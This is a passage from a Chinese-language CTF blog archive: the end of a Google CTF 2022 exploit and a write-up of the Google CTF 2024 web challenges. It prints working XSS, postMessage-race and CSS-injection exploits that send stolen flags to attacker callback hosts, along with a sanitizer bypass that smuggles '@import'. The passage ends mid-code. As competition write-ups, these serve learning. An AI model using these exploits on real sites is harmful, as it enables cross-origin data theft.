name=\"loop\">&lt;/iframe> &lt;pre id=\"log\">&lt;/pre> &lt;script> const URL = 'https://postviewer-web.2022.ctfcompetition.com'; const sleep = (d) => new Promise((r) => setTimeout(r, d)); function notify(...args)&#123; navigator.sendBeacon('', args); console.log(...args); &#125; async function load(win, url) &#123; const buffer = new Uint8Array(1e7); win.location = 'about:blank'; await new Promise((resolve) => &#123; loop.onmessage = () => &#123; try &#123; win.origin; resolve(); &#125; catch (e) &#123; loop.postMessage(null); &#125; &#125;; loop.postMessage(null); &#125;); win.location = url; await new Promise((resolve) => &#123; loop.onmessage = () => &#123; if (win.length === 1) &#123; // Send a huge message so e.data.toString() blocks a thread for a while // By transfering only a reference to memory chunk, sending the message // will be fast enough to race condition window.onmessage and iframe.onload // notify(Date.now(), '==1'); win?.postMessage(buffer, '*', [buffer.buffer]); // Once we know the innerIframe loaded, we can now postMessage to it // because it will be rendered in a different process in Chrome, so // the blocked parent thread won't affect rendering the iframe! setTimeout(() => &#123; win[0]?.postMessage( &#123; body: `LOL! &lt;script>onmessage=async (e)=>&#123; let text = await e.data.body.text(); parent.opener.postMessage(&#123;stolen: text&#125;, '*'); &#125;&lt;\\/script>`, mimeType: \"text/html\", &#125;, \"*\" ); resolve(); &#125;, 500); &#125; else &#123; loop.postMessage(null); &#125; &#125;; loop.postMessage(null); &#125;); return 1; &#125; var TIMEOUT = 1500; var win; function waitForMessage(url) &#123; return new Promise(async resolve => &#123; onmessage = e => &#123; if (e.data.stolen) &#123; notify(e.data.stolen); log.innerText += e.data.stolen + '\\n'; resolve(false); &#125; &#125; const rnd = 'a' + Math.random().toString(16).slice(2); const _url = url + ',' + rnd; await load(win, _url); setTimeout(() => &#123; resolve(true); &#125;, TIMEOUT); &#125;); &#125; onload = onclick = async () => &#123; if (!win || win.closed) &#123; win = open('about:blank', 'hack', 'width=800,height=300,top=500'); &#125; for (let i = 1; i &lt; 100; i++) &#123; const url = `$&#123;URL&#125;/#a,.list-group-item:nth-child($&#123;i&#125;)`; while (await waitForMessage(url)); &#125; &#125;; &lt;/script> &lt;/body> &lt;/html>","link":"/2022/07/09/google-ctf-2022-writeup/"},{"title":"GoogleCTF 2024 筆記","text":"這半年左右因為有其他事情在忙，有段時間沒有好好打一場 CTF 了，這次為了 GoogleCTF 2024 騰出時間，跟隊友一起把所有 web 都解掉了。 然後題目依舊很有趣，這次有三題有參與到，另外兩題比較簡單的隊友都先解掉了，沒機會看，但還是會稍微做個紀錄。難得有這種幾乎都是 client-side challenge 的 CTF，我是滿喜歡的。 關鍵字： URL parser 繞過 parseInt 後面可以帶字串 [a-Z] regex 會包含特殊字元 cookie tossing CSS injection GRAND PRIX HEAVEN (67 solves)隊友速度太快，還來不及加入就被解開了。 核心程式碼是這一段： app.get(\"/fave/:GrandPrixHeaven\", async (req, res) => &#123; const grandPrix = await Configuration.findOne(&#123; where: &#123; public_id: req.params.GrandPrixHeaven &#125;, &#125;); if (!grandPrix) return res.status(400).json(&#123; error: \"ERROR: ID not found\" &#125;); let defaultData = &#123; 0: \"csp\", 1: \"retrieve\", 2: \"apiparser\", 3: \"head_end\", 4: \"faves\", 5: \"footer\", &#125;; let needleBody = defaultData; if (grandPrix.custom != \"\") &#123; try &#123; needleBody = JSON.parse(grandPrix.custom); for (const [k, v] of Object.entries(needleBody)) &#123; if (!TEMPLATE_PIECES.includes(v.toLowerCase()) || !isNum(parseInt(k)) || typeof(v) == 'object') throw new Error(\"invalid template piece\"); // don't be sneaky. We need a CSP! if (parseInt(k) == 0 &amp;&amp; v != \"csp\") throw new Error(\"No CSP\"); &#125; &#125; catch (e) &#123; console.log(`ERROR IN /fave/:GrandPrixHeaven:\\n$&#123;e&#125;`); return res.status(400).json(&#123; error: \"invalid custom body\" &#125;); &#125; &#125; needle.post( TEMPLATE_SERVER, needleBody, &#123; multipart: true, boundary: BOUNDARY &#125;, function (err, resp, body) &#123; if (err) &#123; console.log(`ERROR IN /fave/:GrandPrixHeaven:\\n$&#123;e&#125;`); return res.status(500).json(&#123; error: \"error\" &#125;); &#125; return res.status(200).send(body); &#125; ); &#125;); needleBody 是可控的，主要是會檢查 key 跟 value 的合法性，但 key 的檢查 isNum(parseInt(k)) 有問題，parseInt 的轉換很寬鬆，parseInt(&#39;123hello&#39;) 會變成 123，所以可以在數字後面放任意字串繞過。 這邊的 boundary 是已知的，因此可以自己從 key 偷渡資料進去。 接著會發一個請求到 TEMPLATE_SERVER 去，然後 TEMPLATE_SERVER 是這樣處理的： const templates = require('./templates'); const parseMultipartData = (data, boundary) => &#123; var chunks = data.split(boundary); // always start with the &lt;head> element var processedTemplate = templates.head_start; // to prevent loading an html page of arbitrarily large size, limit to just 7 at a time let end = 7; if (chunks.length-1 &lt;= end) &#123; end = chunks.length-1; &#125; for (var i = 1; i &lt; end; i++) &#123; // seperate body from the header parts var lines = chunks[i].split('\\r\\n\\r\\n') .map((item) => item.replaceAll(\"\\r\\n\", \"\")) .filter((item) => &#123; return item != ''&#125;) for (const item of Object.keys(templates)) &#123; if (lines.includes(item)) &#123; processedTemplate += templates[item]; &#125; &#125; &#125; return processedTemplate; &#125; 如上所述，我們可以自己偷加東西進去，並且讓 csp 不要被渲染。 而前端的部分有一個地方要繞： constructor(url) &#123; const clean = (path) => &#123; try &#123; if (!path) throw new Error(\"no path\"); let re = new RegExp(/^[A-z0-9\\s_-]+$/i); if (re.test(path)) &#123; // normalize let cleaned = path.replaceAll(/\\s/g, \"\"); return cleaned; &#125; else &#123; throw new Error(\"regex fail\"); &#125; &#125; catch (e) &#123; console.log(e); return \"dfv\"; &#125; &#125;; url = clean(url); this.url = new URL(url, 'https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/'); &#125; 這裡的檢查 A-z 是重點，因為中間有些符號被加進去了，如 \\，因此可以讓 url 是 \\test，就可以蓋掉原本的 /api/get-car，把路徑改掉。 上面只是簡單記錄一下，想看更詳細的步驟跟題目，可以直接看作者的 writeup：https://github.com/google/google-ctf/tree/main/2024/quals/web-grandprixheaven/solution SAPPY (64 solves)這題一樣我還沒看的時候隊友就解掉了，大概講一下核心以及記錄一下 Discord 的討論。 核心程式碼如下： const Uri = goog.require(\"goog.Uri\"); function validate(host) &#123; const h = Uri.parse(host); if (h.hasQuery()) &#123; throw \"invalid host\"; &#125; if (h.getDomain() !== \"sappy-web.2024.ctfcompetition.com\") &#123; throw \"invalid host\"; &#125; return host; &#125; 基本上就是要繞過這個檢查，讓傳入的網址可以發送請求到自己的 server。 有看到兩種繞過方式，一種是用 data URI：data://sappy-web.2024.ctfcompetition.com/;base64,...，對這個 lib 來說，domain 會被解析為 sappy-web.2024.ctfcompetition.com。 另一種是 \\\\\\\\www%2eURL%2ex://sappy-web.2024.ctfcompetition.com，讓 parser 認為前面的 \\\\\\\\www%2eURL%2ex 是 scheme，但對瀏覽器來說會把 \\\\ 解析成 //，因此就是 https://www.URL.ex//sappy-web.2024.ctfcompetition.com。 更詳細的過程可以參考這篇： googleCTF 2024 sappy POSTVIEWER V3 (19 solves)2022 年的 v1 沒解出來，2023 年的 v2 也沒解出來，到了今年出了 v3，終於解出來了。 今年的版本核心概念跟之前一樣，都是想做出一個有 sandbox 的 preview file 機制。介面很簡單，就一個讓你可以新增檔案的功能而已： 點擊檔案以後，會更新 URL 上的 hash，這個 hash 的值是 sha1(filename)，接著根據檔案名稱去 IndexedDB 裡面取得內容，然後才是重點。 取得內容以後，會先產生一個 sandbox domain，這個 domain 的名稱取決於：calculateHash(body, product, window.origin, location.href)，body 是一個固定的 HTML，product 也是固定的。 再來會用 iframe 載入這個 sandbox domain，並且在 query string 帶上：?o=$&#123;window.origin&#125;，底下是範例： https:&#x2F;&#x2F;sbx-0wguyijf8lspklnc3724kqvia43l62tu7v1l2gdelcy503m2cd. postviewer3-web.2024.ctfcompetition.com&#x2F;postviewer&#x2F;shim.html ?o&#x3D;https%3A%2F%2Fpostviewer3-web.2024.ctfcompetition.com 那這個 shim.html 裡面在幹嘛呢？內容很簡單，我只擷取 JavaScript 相關的段落： const HASH_REGEXP = /^sbx-([a-z0-9]&#123;50&#125;)[.]/; const PRODUCT_REGEXP = /[/]([a-z0-9_-]*)[/]shim.html/; let FILE_HASH, PRODUCT function _throw(err)&#123; document.body.innerText = err; throw Error(err); &#125; try&#123; FILE_HASH = HASH_REGEXP.exec(location.host)[1]; &#125;catch(e)&#123; _throw(\"Incorrect hash\"); &#125; try&#123; PRODUCT = PRODUCT_REGEXP.exec(location.pathname)[1]; &#125;catch(e)&#123; _throw(\"Incorrect product\"); &#125; const TRUSTED_ORIGIN = new URL(location.href).searchParams.get('o'); if(!/^https?:\\/\\//.test(TRUSTED_ORIGIN)) &#123; _throw(\"Untrusted Origin\"); &#125; function arrayToBase36(arr) &#123; return arr .reduce((a, b) => BigInt(256) * a + BigInt(b), BigInt(0)) .toString(36); &#125; async function calculateHash(...strings)&#123; const encoder = new TextEncoder(); const string = strings.join(''); const hash = await crypto.subtle.digest('SHA-256', encoder.encode(string)); return arrayToBase36(new Uint8Array(hash)).padStart(50, '0').slice(0, 50); &#125; window.onmessage = async (e) => &#123; if(e.origin !== TRUSTED_ORIGIN)&#123; _throw(\"Wrong origin\"); &#125; if (e.data.body === undefined || !e.data.mimeType) &#123; _throw(\"No content to render\"); &#125;; const &#123;body, salt, mimeType&#125; = e.data; [body, salt, mimeType, PRODUCT, TRUSTED_ORIGIN].forEach(e=>&#123; if (typeof e !== 'string') &#123; _throw(`Expected '$&#123;e&#125;' to be a string.`); &#125; &#125;); const hash = await calculateHash(body, PRODUCT, TRUSTED_ORIGIN, salt); if (hash !== FILE_HASH) &#123; _throw(`Expected hash: $&#123;hash&#125;`); &#125; const blob = new Blob([body], &#123; type: mimeType &#125;); window.onmessage = null; e.source.postMessage('blob loaded', e.origin); location.replace(URL.createObjectURL(blob)); &#125;; 基本上就是檢查幾個東西： onmessage 的 origin 是不是網址列上的 origin 傳入的資料 hash 過後，是不是與 domain name 相等 如果以上都符合，那就把傳入的 body 變成 blob，然後載入這個 blob。 接著讓我們回來看剛剛提到的 iframe，在這個 shim.html 的 iframe 載入完成後，會向這個 iframe postMessage，傳入剛剛講的固定的 HTML，內容為： &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;title>Evaluator&lt;/title> &lt;script> onmessage = e => &#123; if(e.source !== parent) &#123; throw /not parent/; &#125;; if(e.data.eval)&#123; eval(e.data.eval); &#125; &#125; onload = () => &#123; parent.postMessage('loader ready','*'); &#125; &lt;/script> &lt;style> body&#123; padding: 0px; margin: 0px; &#125; iframe&#123; width: 100vw; height: 100vh; border: 0; &#125; .spinner &#123; background: url(https://storage.googleapis.com/gctf-postviewer/spinner.svg) center no-repeat; &#125; .spinner iframe&#123; opacity: 0.2 &#125; &lt;/style> &lt;/head> &lt;body> &lt;div id=\"container\" class=\"spinner\">&lt;/div> &lt;/body> &lt;/html> 因此，這時 iframe 的內容會變成上面的 HTML，就只是 eval 傳入的參數而已。 而最後一步，會向這個 iframe postMessage，把檔案的內容跟 mimeType 帶上，然後 eval 底下這一段程式碼： const container = document.querySelector(\"#container\"); container.textContent = ''; const iframe = document.createElement('iframe'); iframe.src = URL.createObjectURL(new Blob([e.data.body], &#123;type: e.data.type&#125;)); if(e.data.sandbox) &#123; iframe.sandbox = e.data.sandbox; &#125; container.appendChild(iframe); setTimeout(()=>&#123; container.classList.remove('spinner'); &#125;, 5000); iframe.onload = () => &#123; setTimeout(()=>&#123; container.classList.remove('spinner'); &#125;, 500); &#125;; 所以最後在這個 iframe 裡面又會有一個 sandboxed iframe，檔案的內容就在裡面。 是不是很複雜？我當初反反覆覆看了幾遍才搞懂整個流程在幹嘛，還順手畫了一張示意圖： 在解這題的時候，我一開始在想這些 onmessage 能不能被攻破，但想了一下之後發現沒辦法。 因為所有的 iframe 都有對 source.origin 做驗證，因此沒有辦法從不合法的 origin 傳訊息進去。而另一方面，很明顯的我們可以拿到某些 sandbox 的 XSS，只要拿自己的 origin 算出 hash 即可。 但是拿一個隨機的 sandbox XSS 是沒用的，我們有沒有可能拿到含有 flag 的 sandbox domain 的 XSS？ 產生 domain 的 hash 由底下四個元素組成： body（固定） product（固定） window.origin（固定） location.href（會包含 hash，但我們不知道 hash 內容） 我第一個想法是，能不能讓程式碼執行到這一段時，讓 location.hash 變回空的，這樣所有的內容都已知，就可以算出 hash。 處理 hash 的程式碼如下： const processHash = async () => &#123; safeFrameModal.hide(); if (location.hash.length &lt;= 1) return; const hash = location.hash.slice(1); if (hash.length &lt; 5) &#123; const id = parseInt(hash); location.hash = filesList.querySelectorAll('a')[id].id; return; &#125; const fileDiv = document.getElementById(hash); if (fileDiv === null || !fileDiv.dataset.name) return; previewIframeDiv.textContent = ''; await sleep(0); previewFile(db.getFile(fileDiv.dataset.name), previewIframeDiv); /* If modal is not shown remove hash */ setTimeout(() => &#123; if (!previewModalDiv.classList.contains('show')) &#123; location.hash = ''; &#125; &#125;, 2000); &#125; window.addEventListener('hashchange', processHash, true); 中間有一個 await sleep(0) 讓後續的操作變成非同步，所以理論上可以 race condition 一下，讓這一段拿到的 hash 是 #0 然後變成 flag file id，但之後跑到 previewFile 時，location.hash 變成 #。 不過後來我想了想，這樣也是沒用的，因為 trust origin 還是題目的 domain，就算知道了 hash，我也沒辦法做任何事。 但過不久我重新看了一次產生 hash 的程式碼： async function calculateHash(...strings) &#123; const encoder = new TextEncoder(); const string = strings.join(\"\"); const hash = await crypto.subtle.digest(\"SHA-256\", encoder.encode(string)); return arrayToBase36(new Uint8Array(hash)).padStart(50, \"0\").slice(0, 50); &#125; 這邊就只是將傳入的四個參數拼在一起而已，因此以題目來說，每個參數如下： body: BODY product: postviewer origin: https:&#x2F;&#x2F;postviewer3-web.2024.ctfcompetition.com href: https:&#x2F;&#x2F;postviewer3-web.2024.ctfcompetition.com&#x2F;#file-sha1-hash 拼出來的結果是： BODYpostviewer&#123;CHALL_ORIGIN&#125;&#123;CHALL_ORIGIN&#125;&#x2F;#file-sha1-hash 假如我們真的可以控制 hash 的話，可以變成這樣： BODYpostviewer&#123;CHALL_ORIGIN&#125;&#123;CHALL_ORIGIN&#125;&#x2F;#postviewerhttps:&#x2F;&#x2F;example.com 如此一來，底下的輸出就會算出一個相同的結果： body: BODYpostviewer&#123;CHALL_ORIGIN&#125;&#123;CHALL_ORIGIN&#125;&#x2F;# product: postviewer origin: https:&#x2F;&#x2F;example.com href: &#39;&#39; 此時的 origin 已經變成了我們自己的 domain，因此就可以偽造出一個相同 hash 的 sandbox domain，並且 trust origin 是我們自己。 拿到 sandbox XSS 之後就簡單了，我原本的想法是既然都是 same-origin 了，就直接蓋掉 onmessage 或是 Blob，攔截一下輸入就好，畢竟最後含有 flag 的 iframe 沒辦法存取，因為 origin 會是 null。 總之呢，想法大致如上，不過最困難的就是到底要怎麼觸發這個 race condition，我自己的 exploit 如下： &lt;body> &lt;div id=log>&lt;/div> &lt;/body> &lt;script> const sleep = ms => new Promise(r => setTimeout(r, ms)) const callbackUrl = window.origin const evaluatorHtml = `&#123;NOT_IMPORTANT&#125;`; function arrayToBase36(arr) &#123; return arr .reduce((a, b) => BigInt(256) * a + BigInt(b), BigInt(0)) .toString(36); &#125; async function calculateHash(...strings)&#123; const encoder = new TextEncoder(); const string = strings.join(''); const hash = await crypto.subtle.digest('SHA-256', encoder.encode(string)); return arrayToBase36(new Uint8Array(hash)).padStart(50, '0').slice(0, 50); &#125; async function getSandboxXss() &#123; return new Promise(async (resolve) => &#123; const selfOrigin = window.origin const PRODUCT = 'postviewer' const data = &#123; body: evaluatorHtml + 'postviewerhttps://postviewer3-web.2024.ctfcompetition.comhttps://postviewer3-web.2024.ctfcompetition.com/#', salt: '', mimeType: 'text/html; charset=utf-8' &#125; const hash = await calculateHash(data.body, PRODUCT, selfOrigin, data.salt); log.innerText += 'hash:' + hash const url = `https://sbx-$&#123;hash&#125;.postviewer3-web.2024.ctfcompetition.com/postviewer/shim.html?o=$&#123;encodeURIComponent(selfOrigin)&#125;` const iframe = document.createElement('iframe') iframe.src = url iframe.onload = function() &#123; iframe.contentWindow.postMessage(data, '*') setTimeout(() => &#123; iframe.contentWindow.postMessage(&#123; eval: `fetch('$&#123;callbackUrl&#125;/step_1_xss'); let stop = false for(let i=1; i&lt;=3; i++) &#123; fetch('$&#123;callbackUrl&#125;/open_' + i) let win = window.open(\"https://postviewer3-web.2024.ctfcompetition.com/\") setTimeout(() => &#123; setInterval(function() &#123; if (stop) return win.location = \"https://postviewer3-web.2024.ctfcompetition.com/#0\" &#125;, 2) setInterval(function()&#123; if (stop) return win.location = \"https://postviewer3-web.2024.ctfcompetition.com/#postviewer$&#123;window.origin&#125;\" &#125;, 6) setInterval(function() &#123; if (stop) return try &#123; win.frames[0].origin stop = true fetch('$&#123;callbackUrl&#125;/correct_sandbox') win.frames[0].onmessage = function(e) &#123; fetch('$&#123;callbackUrl&#125;/flag', &#123; method: 'POST', body: JSON.stringify(e.data) &#125;) &#125; win.frames[0].Blob = function(a) &#123; fetch('$&#123;callbackUrl&#125;/ping') fetch('$&#123;callbackUrl&#125;/flag', &#123; method: 'POST', body: a &#125;) &#125; &#125; catch (err) &#123;&#125; &#125;, 2) &#125;, 500) &#125; ` &#125;, '*') resolve() &#125;, 1000) &#125; document.body.appendChild(iframe) &#125;) &#125; async function main() &#123; fetch('/start') await getSandboxXss() &#125; main() &lt;/script> 基本上就是開三個 interval，一個更新成 #0，一個更新成我們要的樣子，另一個則是不斷去覆蓋 flag iframe 的函式。觀察後發現有成功 XSS 幾次，但就沒有後續了，要嘛是 code 寫壞，要嘛是 modal 關掉了所以來不及。 總之呢，我自己還在嘗試的時候，隊友就做出來了，概念差不多，唯一的差別大概是 interval 的數字還有最後拿 flag 的方法。 雖然說 flag 內容是 sandboxed iframe，但是載入這個 iframe 的網頁是 same-origin 的，因此直接拿 iframe 的 src（會是一個 blob）再去 fetch 一下就好，因為也是 same-origin。 結論：race condition 真難，就算發現了也不一定撞得出來。 話說出題者 terjanq 給的官方解答在這裡：https://github.com/google/google-ctf/tree/main/2024/quals/web-postviewer3 中間多了一步要在 storage.googleapis.com 上找一個 XSS，不過整體概念都是一樣的，只是偽造出 hash 的方式不同。 GAME ARCADE (14 solves)這題其實跟 POSTVIEWER V3 滿像的，有許多程式碼甚至是共用或者是改良版，其實有點算偷偷在給 POSTVIEWER V3 提示（？） 總之功能就是有四個小遊戲，點下去之後會用 sandbox domain + shim.html（基本上就是 POSTVIEWER V3 的那個 shim）載入固定的 HTML。 這邊計算 sandbox hash 的方法跟之前不同，會用特殊符號進行 join，所以無法偽造。 而四個小遊戲中，有一個很明顯不是遊戲，部分程式碼如下： let password = getCookie('password') || localStorage.getItem('password') || \"okoń\"; let correctPasswordSpan = document.createElement('span'); correctPasswordSpan.classList.add('correct'); correctPasswordSpan.innerHTML = password; let steps = 0; function savePassword(pwd)&#123; document.cookie = `password=$&#123;pwd&#125;`; localStorage.setItem('password', pwd) return pwd; &#125; function changePwd()&#123; steps = 0; password = passwordInp.value; correctPasswordSpan.innerHtml = password; output.innerHTML = 'Password changed.'; savePassword(password); &#125; 這題的 bot 最後是透過 changePwd 寫入 flag，因此目標是執行 XSS，偷到在 cookie 或是 localStorage 裡面的 password。 從上面程式碼中很明顯可以看出，如果我們能蓋掉 cookie，就能有個 XSS。 為什麼呢？因為 password 可控，然後 correctPasswordSpan.innerHTML = password，雖然說 correctPasswordSpan 並沒有被放到畫面上，但其實還是有 XSS 的風險，真實案例可以看我之前跟 @sudi 找到的 figma XSS：Interesting case of a DOM XSS in www.figma.com 要覆蓋 cookie 的話，立刻能想到的就是從其他 domain 來的 cookie tossing，但這題的話 *.usercontent.goog 在 public suffix 裡面，所以沒辦法從其他 subdomain 寫入。 而剛好我隊友在解 POSTVIEWER V3 的時候有個想法可以用在這裡，他在當時就提了說不定可以構造一個 http://sbx-fake.sbx-real.postviewer3-web.2024.ctfcompetition.com/ 的 domain，雖然在那題沒什麼用，但在這題就是解答了。 我們想影響的 domain 為 https://0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog/google-ctf/shim.html 可以構造出一個 HTTP subdomain 的 XSS：http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-h641507400.0ta1gxvglkyjct11uf3lvr9g3b45whebmhcjklt106au2kgy3e-h641507400.scf.usercontent.goog/google-ctf/shim.html 就從這個 subdomain 做 cookie tossing 就行了（實際上真的 domain 要用你的 origin 去算，上面只是個範例證明 subdomain 可行）。 作者的 writeup 在這：https://github.com/google/google-ctf/tree/main/2024/quals/web-game-arcade 看了之後才知道原來 Chrome 在 blob 裡面沒辦法使用 cookie。 另外，我也跟作者一樣好奇為什麼這題明明比較簡單，但是解出來的隊伍卻比較少，我猜可能是沒想到可以構造一個 subdomain 吧？如果不是隊友提醒的話，搞不好我也想不到。 IN-THE-SHADOWS (5 solves)這題的核心程式碼非常簡單： const UNSAFE_CSS_REGEX = /(@import|url[(])/i; /** * @param &#123;string&#125; stylesheetText */ function sanitizeStyleSheet(stylesheetText) &#123; // Early exit for imports and external URLs if (UNSAFE_CSS_REGEX.test(stylesheetText)) &#123; return \"\"; &#125; const sheet = new CSSStyleSheet(); sheet.replaceSync(stylesheetText); for (let i = sheet.cssRules.length - 1; i >= 0; i--) &#123; const rule = sheet.cssRules[i]; if (shouldDeleteRule(rule)) &#123; sheet.deleteRule(i); &#125; &#125; const safeCss = Array.from(sheet.cssRules) .map((r) => r.cssText) .join(\"\\n\"); // Do the check again if somehow @import or url() reappears during re-serialization. if (UNSAFE_CSS_REGEX.test(safeCss)) &#123; return \"\"; &#125; return safeCss; &#125; /** * @param &#123;CSSRule&#125; rule * @returns &#123;boolean&#125; */ function shouldDeleteRule(rule) &#123; if ( rule instanceof CSSImportRule || rule instanceof CSSMediaRule || rule instanceof CSSFontFaceRule || rule instanceof CSSLayerBlockRule || rule instanceof CSSLayerStatementRule || rule instanceof CSSNamespaceRule || rule instanceof CSSSupportsRule || rule instanceof CSSPageRule || rule instanceof CSSPropertyRule ) &#123; return true; &#125; // :has, :before etc. are potentially dangerous. if (rule instanceof CSSStyleRule &amp;&amp; rule.selectorText.includes(\":\")) &#123; return true; &#125; return false; &#125; 簡單來說呢，你能夠在一個 shadow DOM 裡面插入 &lt;style&gt; 標籤，但是標籤的內容會被上面的規則過濾掉，而目標是要偷到 parent body 屬性的 secret，格式類似於：00ae32216ba630c797e19594d51fc2da0b5b7d6600000000e56c64a39f94843840757e667798110efb32fac16789565d66efb62c4a0492c6 一開始在看這題的時候，很明顯就是要用 CSS injection 去把東西偷出來，而有兩個難點： 如何偷到 shadow DOM 以外的元素 如何繞過 sanitizer 這題一開始是隊友先看的，第一個問題可以用 :host-context(body[secret^=&quot;00&quot;]) 來解，用這個 selector 可以選到 shadow DOM 之外的東西。 而第二題的話，可以用除了被封鎖的那些 rule 以外的規則，例如說 @scope 或是 @container： &lt;style> .container&#123; container-type: inline-size; &#125; @container (min-width: 500px) &#123; :host-context(body[secret^=\"00\"]) p &#123; color: red; &#125; &#125; &lt;/style> &lt;div class=\"container\"> &lt;p>test&lt;/p> &lt;/div> 之所以可以靠這樣繞過，是因為在檢查規則時並不是遞迴檢查，只會檢查最上層，因此只要把 selector 藏在 @container 裡面，就不會被檢查到。 解決這兩個問題之後，下一步就是要把東西偷出來了。 因為 @import 跟 url 都被封住了，所以沒辦法只靠 CSS 來 leak，需要靠 HTML 的幫助，例如說最常用的 lazy-loading image。 把一個 img 先設成 display:none 並且加上 loading=lazy，就不會發出請求。接著用 CSS 設定成 display:block，就會發出請求（我記得以前我也試過，但不管怎樣都會發出請求，要嘛是我記錯，要嘛是 Chrome 中間有改過機制） 因此呢，就可以根據這一點來產生 payload，大致的內容如下： &lt;style> img &#123; display:none; &#125; .container&#123; container-type: inline-size; &#125; @container (min-width: 100px) &#123; :host-context(body[secret*=\"00\"])&#123; .i00&#123; display:flex; &#125; &#125; :host-context(body[secret*=\"01\"])&#123; .i01&#123; display:flex; &#125; &#125; &#125; &lt;/style> &lt;div class=\"container\"> &lt;img class=i00 loading=lazy src=\"URL?i00\" /> &lt;img class=i01 loading=lazy src=\"URL?i01\" /> &lt;/div> 不過這題的 payload 有字數限制，經過實測之後，發現最多大概只能有 13000 個字元左右，很明顯是不夠用的。 我們想 leak 出 bigram，因此需要 00 到 ff 一共 256 個，13000 &#x2F; 256 &#x3D; 50，鐵定會需要的 :host-context(body[secret*=&quot;00&quot;])&#123;&#125; 就已經 35 個字了，只剩下 15 個字，除非有 url 可以用，否則做不到。 （話說 CSS spec 裡面有個 src()，看起來是 url 的替代用法，但沒作用，看來還沒實作） 就算真的能做到，還有另一個問題，那就是字元太多導致重複率太高。 secret 有 112 個字，因此如果是 bigram，會有 111 組，但我測了幾遍，能有 93 組就已經很難了，代表說有 18 組都是重複的。因此，就必須 brute-force 一下，但是 C(93, 18) &#x3D; 7282746847637522000，怎麼看都不像是個可以暴力搜尋的數字。 因此，這個方向很可能是錯的，沒辦法。 那還有什麼方向呢？另一個方向是利用現有的機制來繞過檢查。 sanitizer 最後會回傳 safeCss，是由每一個 rule 的 cssText 組成的，如果可以讓最後的 cssText 有 @impor\\74 之類的字元，就能夠繞過最後的檢查。 然後隊友就發現了 @font-feature-values &#39;lol &#123;&#125;; @import &quot;lol.com&quot;;p&#39; 在取出 cssText 後，會直接把單引號給去掉。而去掉引號之後，很顯然 CSS 的意思就改變了。 根據這點，就可以給一個這樣的 input： &lt;style> @font-feature-values 'lol; @\\\\0069mport \"//exp.com\";p' &#123;&#125; &lt;/style> 取出 cssText 後會變成： &lt;style> @font-feature-values 'lol; @\\0069mport \"//exp.com\"; p &#123;&#125; &lt;/style> 成功偷渡了 @import 進去，接著就可以用常見的方式去把字元 leak 出來了。 說到這個，感覺應該要準備一個可以隨開即用的 CSS injection server，否則每次都要從頭再寫一個有點累。 這次我是直接用上次 0CTF 2023 寫的 trigram，但是有點 buggy，在把字元組回去那邊沒有考慮好，要跑很多次而且運氣好才能得到正解。 在邊嘗試邊修的狀態下弄了一個小時，運氣很好的拿到 flag。 話說根據 Discord 的賽後討論，這 bug 在近期被修掉了：Properly escape CSS identifiers in serialization. 最後附上完整但不穩定的 exploit： const express = require('express') const app = express() const port = 5555 let leaks = [] const BASE = 'https://your_server.com' // prepare payload let chars = '0123456789abcdef' let arr = [] for(let a of chars) &#123; for(let b of chars) &#123; for(let c of chars) &#123; let str = a+b+c; arr.push(str) &#125; &#125; &#125; let payload1 = '' let crossPayload1 = 'url(\"/\")' let payload2 = '' let crossPayload2 = 'url(\"/\")' let payload3 = '' let crossPayload3 = 'url(\"/\")' const third = Math.floor(arr.length / 3); const arr1 = arr.slice(0, third); const arr2 = arr.slice(third, 2 * third); const arr3 = arr.slice(2 * third); for(let str of arr1) &#123; payload1 += `:host-context(*[secret*=\"$&#123;str&#125;\"])&#123;--$&#123;str&#125;:url(\"$&#123;BASE&#125;/leak?q=$&#123;str&#125;\")&#125;\\n` crossPayload1 = `-webkit-cross-fade($&#123;crossPayload1&#125;, var(--$&#123;str&#125;, none), 50%)` &#125; for(let str of arr2) &#123; payload2 += `:host-context(*[secret*=\"$&#123;str&#125;\"])&#123;--$&#123;str&#125;:url(\"$&#123;BASE&#125;/leak?q=$&#123;str&#125;\")&#125;\\n` crossPayload2 = `-webkit-cross-fade($&#123;crossPayload2&#125;, var(--$&#123;str&#125;, none), 50%)` &#125; for(let str of arr3) &#123; payload3 += `:host-context(*[secret*=\"$&#123;str&#125;\"])&#123;--$&#123;str&#125;:url(\"$&#123;BASE&#125;/leak?q=$&#123;str&#125;\")&#125;\\n` crossPayload3 = `-webkit-cross-fade($&#123;crossPayload3&#125;, var(--$&#123;str&#125;, none), 50%)` &#125; payload1 = `$&#123;payload1&#125; .p1&#123;background-image:$&#123;crossPayload1&#125; &#125;` payload2 = `$&#123;payload2&#125; .p2&#123;background-image:$&#123;crossPayload2&#125; &#125;` payload3 = `$&#123;payload3&#125; .p3&#123;background-image:$&#123;crossPayload3&#125; &#125;` function filterFirst(arr, item) &#123; const result = [] let found = false for(let a of arr) &#123; if (a===item &amp;&amp; !found) &#123; found = true continue &#125; result.push(a) &#125; return result &#125; async function getFlag(secret) &#123; return fetch('https://in-the-shadows-web.2024.ctfcompetition.com/check-secret?secret=' + secret).then(res => res.text()).then((text) => &#123; if (text !== 'Invalid secret') &#123; console.log(text) &#125; &#125;).catch(err => console.log('err', err.message)) &#125; function mergeWords(arr, ending) &#123; if (arr.length === 0) return ending if (!ending) &#123; for(let i=0; i&lt;arr.length; i++) &#123; let isFound = false for(let j=0; j&lt;arr.length; j++) &#123; if (i === j) continue let suffix = arr[i][1] + arr[i][2] let prefix = arr[j][0] + arr[j][1] if (suffix === prefix) &#123; isFound = true continue &#125; &#125; if (!isFound) &#123; console.log('ending:', arr[i]) return mergeWords(filterFirst(arr, arr[i]), arr[i]) &#125; &#125; console.log('Error, please try again') return &#125; let found = [] for(let i=0; i&lt;arr.length; i++) &#123; let length = ending.length let suffix = ending[0] + ending[1] let prefix = arr[i][1] + arr[i][2] if (suffix === prefix) &#123; found.push([filterFirst(arr, arr[i]), arr[i][0] + ending]) &#125; &#125; return found.map((item) => &#123; return mergeWords(item[0], item[1]) &#125;) &#125; function handleLeak() &#123; let str = '' let arr = [...leaks] leaks = [] console.log('received:', JSON.stringify(arr)) const merged = mergeWords(arr, null); console.log('leaked:', merged.flat(9999)) return merged.flat(9999) &#125; app.get('/leak', async (req, res) => &#123; leaks.push(req.query.q) console.log('recevied:', req.query.q, leaks.length) //console.log(leaks) if (leaks.length 